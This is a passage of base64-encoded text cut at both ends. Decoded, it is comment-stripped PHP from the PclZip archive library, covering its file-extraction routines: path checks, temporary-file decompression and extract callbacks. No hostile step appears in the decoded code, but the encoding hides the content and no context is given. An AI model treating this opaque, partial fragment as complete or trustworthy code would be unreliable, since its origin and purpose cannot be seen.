sdDEgPCAxKSB7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDE7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXIsICRwX2ZpbGVfbGlzdFskdl9uYl9leHRyYWN0ZWQrK10pKSAhPSAxKQ0KICAgICAgICB7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCR2X3Jlc3VsdDEgPT0gMikgew0KICAgICAgICAJYnJlYWs7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQogIH0NCg0KICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkV4dHJhY3RGaWxlKCYkcF9lbnRyeSwgJHBfcGF0aCwgJHBfcmVtb3ZlX3BhdGgsICRwX3JlbW92ZV9hbGxfcGF0aCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRmlsZUhlYWRlcigkdl9oZWFkZXIpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQoNCiAgaWYgKCR0aGlzLT5wcml2Q2hlY2tGaWxlSGVhZGVycygkdl9oZWFkZXIsICRwX2VudHJ5KSAhPSAxKSB7DQogIH0NCg0KICBpZiAoJHBfcmVtb3ZlX2FsbF9wYXRoID09IHRydWUpIHsNCiAgICAgIGlmICgoJHBfZW50cnlbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApIHsNCg0KICAgICAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJmaWx0ZXJlZCI7DQoNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KDQogICAgICAkcF9lbnRyeVsnZmlsZW5hbWUnXSA9IGJhc2VuYW1lKCRwX2VudHJ5WydmaWxlbmFtZSddKTsNCiAgfQ0KDQogIGVsc2UgaWYgKCRwX3JlbW92ZV9wYXRoICE9ICIiKQ0KICB7DQogICAgaWYgKFBjbFppcFV0aWxQYXRoSW5jbHVzaW9uKCRwX3JlbW92ZV9wYXRoLCAkcF9lbnRyeVsnZmlsZW5hbWUnXSkgPT0gMikNCiAgICB7DQoNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJmaWx0ZXJlZCI7DQoNCiAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgfQ0KDQogICAgJHBfcmVtb3ZlX3BhdGhfc2l6ZSA9IHN0cmxlbigkcF9yZW1vdmVfcGF0aCk7DQogICAgaWYgKHN1YnN0cigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgMCwgJHBfcmVtb3ZlX3BhdGhfc2l6ZSkgPT0gJHBfcmVtb3ZlX3BhdGgpDQogICAgew0KDQogICAgICAkcF9lbnRyeVsnZmlsZW5hbWUnXSA9IHN1YnN0cigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgJHBfcmVtb3ZlX3BhdGhfc2l6ZSk7DQoNCiAgICB9DQogIH0NCg0KICBpZiAoJHBfcGF0aCAhPSAnJykgew0KICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gJHBfcGF0aC4iLyIuJHBfZW50cnlbJ2ZpbGVuYW1lJ107DQogIH0NCiAgDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT05dKSkgew0KICAgICR2X2luY2x1c2lvbg0KICAgID0gUGNsWmlwVXRpbFBhdGhJbmNsdXNpb24oJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0VYVFJBQ1RfRElSX1JFU1RSSUNUSU9OXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwX2VudHJ5WydmaWxlbmFtZSddKTsgDQogICAgaWYgKCR2X2luY2x1c2lvbiA9PSAwKSB7DQoNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfRElSRUNUT1JZX1JFU1RSSUNUSU9OLA0KCQkgICAgICAgICAgICAgICAgICAgICAiRmlsZW5hbWUgJyIuJHBfZW50cnlbJ2ZpbGVuYW1lJ10uIicgaXMgIg0KCQkJCQkJCSAuIm91dHNpZGUgUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTiIpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQogIH0NCg0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1RdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfZW50cnksICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfRVhUUkFDVF0oUENMWklQX0NCX1BSRV9FWFRSQUNULCAkdl9sb2NhbF9oZWFkZXIpOw0KICAgIGlmICgkdl9yZXN1bHQgPT0gMCkgew0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gInNraXBwZWQiOw0KICAgICAgJHZfcmVzdWx0ID0gMTsNCiAgICB9DQogICAgDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAiYWJvcnRlZCI7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCg0KICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gJHZfbG9jYWxfaGVhZGVyWydmaWxlbmFtZSddOw0KICB9DQoNCg0KICBpZiAoJHBfZW50cnlbJ3N0YXR1cyddID09ICdvaycpIHsNCg0KICBpZiAoZmlsZV9leGlzdHMoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pKQ0KICB7DQoNCiAgICBpZiAoaXNfZGlyKCRwX2VudHJ5WydmaWxlbmFtZSddKSkNCiAgICB7DQoNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJhbHJlYWR5X2FfZGlyZWN0b3J5IjsNCiAgICAgIA0KICAgICAgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl0pKQ0KCSAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1NUT1BfT05fRVJST1JdPT09dHJ1ZSkpIHsNCg0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQUxSRUFEWV9BX0RJUkVDVE9SWSwNCgkJICAgICAgICAgICAgICAgICAgICAgIkZpbGVuYW1lICciLiRwX2VudHJ5WydmaWxlbmFtZSddLiInIGlzICINCgkJCQkJCQkgLiJhbHJlYWR5IHVzZWQgYnkgYW4gZXhpc3RpbmcgZGlyZWN0b3J5Iik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCgkgICAgfQ0KICAgIH0NCiAgICBlbHNlIGlmICghaXNfd3JpdGVhYmxlKCRwX2VudHJ5WydmaWxlbmFtZSddKSkNCiAgICB7DQoNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJ3cml0ZV9wcm90ZWN0ZWQiOw0KDQogICAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXSkpDQoJICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl09PT10cnVlKSkgew0KDQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwsDQoJCSAgICAgICAgICAgICAgICAgICAgICJGaWxlbmFtZSAnIi4kcF9lbnRyeVsnZmlsZW5hbWUnXS4iJyBleGlzdHMgIg0KCQkJCQkJCSAuImFuZCBpcyB3cml0ZSBwcm90ZWN0ZWQiKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KCSAgICB9DQogICAgfQ0KDQogICAgZWxzZSBpZiAoZmlsZW10aW1lKCRwX2VudHJ5WydmaWxlbmFtZSddKSA+ICRwX2VudHJ5WydtdGltZSddKQ0KICAgIHsNCiAgICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFUExBQ0VfTkVXRVJdKSkNCgkgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9SRVBMQUNFX05FV0VSXT09PXRydWUpKSB7DQogIAkgIH0NCgkgICAgZWxzZSB7DQogICAgICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gIm5ld2VyX2V4aXN0IjsNCg0KICAgICAgICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1NUT1BfT05fRVJST1JdKSkNCgkgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl09PT10cnVlKSkgew0KDQogICAgICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfV1JJVEVfT1BFTl9GQUlMLA0KCQkgICAgICAgICAgICAgIk5ld2VyIHZlcnNpb24gb2YgJyIuJHBfZW50cnlbJ2ZpbGVuYW1lJ10uIicgZXhpc3RzICINCgkJCQkgICAgLiJhbmQgb3B0aW9uIFBDTFpJUF9PUFRfUkVQTEFDRV9ORVdFUiBpcyBub3Qgc2VsZWN0ZWQiKTsNCg0KICAgICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCgkgICAgICB9DQoJICAgIH0NCiAgICB9DQogICAgZWxzZSB7DQogICAgfQ0KICB9DQoNCiAgZWxzZSB7DQogICAgaWYgKCgoJHBfZW50cnlbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApIHx8IChzdWJzdHIoJHBfZW50cnlbJ2ZpbGVuYW1lJ10sIC0xKSA9PSAnLycpKQ0KICAgICAgJHZfZGlyX3RvX2NoZWNrID0gJHBfZW50cnlbJ2ZpbGVuYW1lJ107DQogICAgZWxzZSBpZiAoIXN0cnN0cigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgIi8iKSkNCiAgICAgICR2X2Rpcl90b19jaGVjayA9ICIiOw0KICAgIGVsc2UNCiAgICAgICR2X2Rpcl90b19jaGVjayA9IGRpcm5hbWUoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pOw0KDQogICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RGlyQ2hlY2soJHZfZGlyX3RvX2NoZWNrLCAoKCRwX2VudHJ5WydleHRlcm5hbCddJjB4MDAwMDAwMTApPT0weDAwMDAwMDEwKSkpICE9IDEpIHsNCg0KICAgICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAicGF0aF9jcmVhdGlvbl9mYWlsIjsNCg0KICAgICAgICAkdl9yZXN1bHQgPSAxOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIGlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gJ29rJykgew0KDQogICAgaWYgKCEoKCRwX2VudHJ5WydleHRlcm5hbCddJjB4MDAwMDAwMTApPT0weDAwMDAwMDEwKSkNCiAgICB7DQogICAgICBpZiAoJHBfZW50cnlbJ2NvbXByZXNzaW9uJ10gPT0gMCkgew0KDQogICAgICAgIGlmICgoJHZfZGVzdF9maWxlID0gQGZvcGVuKCRwX2VudHJ5WydmaWxlbmFtZSddLCAnd2InKSkgPT0gMCkNCiAgICAgICAgew0KDQogICAgICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gIndyaXRlX2Vycm9yIjsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgIH0NCg0KDQogICAgICAgICR2X3NpemUgPSAkcF9lbnRyeVsnY29tcHJlc3NlZF9zaXplJ107DQogICAgICAgIHdoaWxlICgkdl9zaXplICE9IDApDQogICAgICAgIHsNCiAgICAgICAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgICAgICAgJHZfYnVmZmVyID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgICAgICAgQGZ3cml0ZSgkdl9kZXN0X2ZpbGUsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsgICAgICAgICAgICANCiAgICAgICAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgICAgICAgfQ0KDQogICAgICAgIGZjbG9zZSgkdl9kZXN0X2ZpbGUpOw0KDQogICAgICAgIHRvdWNoKCRwX2VudHJ5WydmaWxlbmFtZSddLCAkcF9lbnRyeVsnbXRpbWUnXSk7DQogICAgICAgIA0KDQogICAgICB9DQogICAgICBlbHNlIHsNCiAgICAgICAgaWYgKCgkcF9lbnRyeVsnZmxhZyddICYgMSkgPT0gMSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfVU5TVVBQT1JURURfRU5DUllQVElPTiwgJ0ZpbGUgXCcnLiRwX2VudHJ5WydmaWxlbmFtZSddLidcJyBpcyBlbmNyeXB0ZWQuIEVuY3J5cHRlZCBmaWxlcyBhcmUgbm90IHN1cHBvcnRlZC4nKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQoNCiAgICAgICAgaWYgKCAoIWlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGXSkpIA0KICAgICAgICAgICAgJiYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfT05dKQ0KICAgICAgICAgICAgICAgIHx8IChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0pDQogICAgICAgICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0gPD0gJHBfZW50cnlbJ3NpemUnXSkpICkgKSB7DQogICAgICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZFeHRyYWN0RmlsZVVzaW5nVGVtcEZpbGUoJHBfZW50cnksICRwX29wdGlvbnMpOw0KICAgICAgICAgIGlmICgkdl9yZXN1bHQgPCBQQ0xaSVBfRVJSX05PX0VSUk9SKSB7DQogICAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZWxzZSB7DQoNCiAgICAgICAgDQogICAgICAgICAgJHZfYnVmZmVyID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXSk7DQogICAgICAgICAgDQogICAgICAgICAgJHZfZmlsZV9jb250ZW50ID0gQGd6aW5mbGF0ZSgkdl9idWZmZXIpOw0KICAgICAgICAgIHVuc2V0KCR2X2J1ZmZlcik7DQogICAgICAgICAgaWYgKCR2X2ZpbGVfY29udGVudCA9PT0gRkFMU0UpIHsNCg0KICAgICAgICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImVycm9yIjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQogICAgICAgICAgDQogICAgICAgICAgaWYgKCgkdl9kZXN0X2ZpbGUgPSBAZm9wZW4oJHBfZW50cnlbJ2ZpbGVuYW1lJ10sICd3YicpKSA9PSAwKSB7DQoNCiAgICAgICAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJ3cml0ZV9lcnJvciI7DQoNCiAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgICAgfQ0KDQogICAgICAgICAgQGZ3cml0ZSgkdl9kZXN0X2ZpbGUsICR2X2ZpbGVfY29udGVudCwgJHBfZW50cnlbJ3NpemUnXSk7DQogICAgICAgICAgdW5zZXQoJHZfZmlsZV9jb250ZW50KTsNCg0KICAgICAgICAgIEBmY2xvc2UoJHZfZGVzdF9maWxlKTsNCiAgICAgICAgICANCiAgICAgICAgfQ0KDQogICAgICAgIEB0b3VjaCgkcF9lbnRyeVsnZmlsZW5hbWUnXSwgJHBfZW50cnlbJ210aW1lJ10pOw0KICAgICAgfQ0KDQogICAgICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1NFVF9DSE1PRF0pKSB7DQoNCiAgICAgICAgQGNobW9kKCRwX2VudHJ5WydmaWxlbmFtZSddLCAkcF9vcHRpb25zW1BDTFpJUF9PUFRfU0VUX0NITU9EXSk7DQogICAgICB9DQoNCiAgICB9DQogIH0NCg0KCWlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gImFib3J0ZWQiKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQoJfQ0KDQogIGVsc2VpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXSkpIHsNCg0KICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCRwX2VudHJ5LCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXShQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNULCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZFeHRyYWN0RmlsZVVzaW5nVGVtcEZpbGUoJiRwX2VudHJ5LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogICAgICANCiAgJHZfZ3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLmd6JzsNCiAgaWYgKCgkdl9kZXN0X2ZpbGUgPSBAZm9wZW4oJHZfZ3ppcF90ZW1wX25hbWUsICJ3YiIpKSA9PSAwKSB7DQogICAgZmNsb3NlKCR2X2ZpbGUpOw0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfV1JJVEVfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gdGVtcG9yYXJ5IGZpbGUgXCcnLiR2X2d6aXBfdGVtcF9uYW1lLidcJyBpbiBiaW5hcnkgd3JpdGUgbW9kZScpOw0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCg0KICAkdl9iaW5hcnlfZGF0YSA9IHBhY2soJ3ZhMWExVmExYTEnLCAweDhiMWYsIENocigkcF9lbnRyeVsnY29tcHJlc3Npb24nXSksIENocigweDAwKSwgdGltZSgpLCBDaHIoMHgwMCksIENocigzKSk7DQogIEBmd3JpdGUoJHZfZGVzdF9maWxlLCAkdl9iaW5hcnlfZGF0YSwgMTApOw0KDQogICR2X3NpemUgPSAkcF9lbnRyeVsnY29tcHJlc3NlZF9zaXplJ107DQogIHdoaWxlICgkdl9zaXplICE9IDApDQogIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdl9kZXN0X2ZpbGUsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogICR2X2JpbmFyeV9kYXRhID0gcGFjaygnVlYnLCAkcF9lbnRyeVsnY3JjJ10sICRwX2VudHJ5WydzaXplJ10pOw0KICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfYmluYXJ5X2RhdGEsIDgpOw0KDQogIEBmY2xvc2UoJHZfZGVzdF9maWxlKTsNCg0KICBpZiAoKCR2X2Rlc3RfZmlsZSA9IEBmb3BlbigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgJ3diJykpID09IDApIHsNCiAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAid3JpdGVfZXJyb3IiOw0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBpZiAoKCR2X3NyY19maWxlID0gQGd6b3Blbigkdl9nemlwX3RlbXBfbmFtZSwgJ3JiJykpID09IDApIHsNCiAgICBAZmNsb3NlKCR2X2Rlc3RfZmlsZSk7DQogICAgJHBfZW50cnlbJ3N0YXR1cyddID0gInJlYWRfZXJyb3IiOw0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQoNCiAgJHZfc2l6ZSA9ICRwX2VudHJ5WydzaXplJ107DQogIHdoaWxlICgkdl9zaXplICE9IDApIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gQGd6cmVhZCgkdl9zcmNfZmlsZSwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQogIEBmY2xvc2UoJHZfZGVzdF9maWxlKTsNCiAgQGd6Y2xvc2UoJHZfc3JjX2ZpbGUpOw0KDQogIEB1bmxpbmsoJHZfZ3ppcF90ZW1wX25hbWUpOw0KICANCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkV4dHJhY3RGaWxlSW5PdXRwdXQoJiRwX2VudHJ5LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRGaWxlSGVhZGVyKCR2X2hlYWRlcikpICE9IDEpIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCg0KICBpZiAoJHRoaXMtPnByaXZDaGVja0ZpbGVIZWFkZXJzKCR2X2hlYWRlciwgJHBfZW50cnkpICE9IDEpIHsNCiAgfQ0KDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfRVhUUkFDVF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9lbnRyeSwgJHZfbG9jYWxfaGVhZGVyKTsNCg0KICAgICR2X3Jlc3VsdCA9ICRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9FWFRSQUNUXShQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQogICAgaWYgKCR2X3Jlc3VsdCA9PSAwKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQogICAgICAkdl9yZXN1bHQgPSAxOw0KICAgIH0NCg0KICAgIGlmICgkdl9yZXN1bHQgPT0gMikgew0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImFib3J0ZWQiOw0KICAgIAkkdl9yZXN1bHQgPSBQQ0xaSVBfRVJSX1VTRVJfQUJPUlRFRDsNCiAgICB9DQoNCiAgICAkcF9lbnRyeVsnZmlsZW5hbWUnXSA9ICR2X2xvY2FsX2hlYWRlclsnZmlsZW5hbWUnXTsNCiAgfQ0KDQoNCiAgaWYgKCRwX2VudHJ5WydzdGF0dXMnXSA9PSAnb2snKSB7DQoNCiAgICBpZiAoISgoJHBfZW50cnlbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApKSB7DQogICAgICBpZiAoJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddID09ICRwX2VudHJ5WydzaXplJ10pIHsNCg0KICAgICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCg0KICAgICAgICBlY2hvICR2X2J1ZmZlcjsNCiAgICAgICAgdW5zZXQoJHZfYnVmZmVyKTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KDQogICAgICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkcF9lbnRyeVsnY29tcHJlc3NlZF9zaXplJ10pOw0KICAgICAgICANCiAgICAgICAgJHZfZmlsZV9jb250ZW50ID0gZ3ppbmZsYXRlKCR2X2J1ZmZlcik7DQogICAgICAgIHVuc2V0KCR2X2J1ZmZlcik7DQoNCiAgICAgICAgZWNobyAkdl9maWxlX2NvbnRlbnQ7DQogICAgICAgIHVuc2V0KCR2X2ZpbGVfY29udGVudCk7DQogICAgICB9DQogICAgfQ0KICB9DQoNCmlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gImFib3J0ZWQiKSB7DQogICAgJHBfZW50cnlbJ3N0YXR1cyddID0gInNraXBwZWQiOw0KfQ0KDQogIGVsc2VpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXSkpIHsNCg0KICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCRwX2VudHJ5LCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXShQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNULCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZFeHRyYWN0RmlsZUFzU3RyaW5nKCYkcF9lbnRyeSwgJiRwX3N0cmluZywgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X2hlYWRlciA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRmlsZUhlYWRlcigkdl9oZWFkZXIpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQoNCiAgaWYgKCR0aGlzLT5wcml2Q2hlY2tGaWxlSGVhZGVycygkdl9oZWFkZXIsICRwX2VudHJ5KSAhPSAxKSB7DQogIH0NCg0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1RdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfZW50cnksICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfRVhUUkFDVF0oUENMWklQX0NCX1BSRV9FWFRSQUNULCAkdl9sb2NhbF9oZWFkZXIpOw0KICAgIGlmICgkdl9y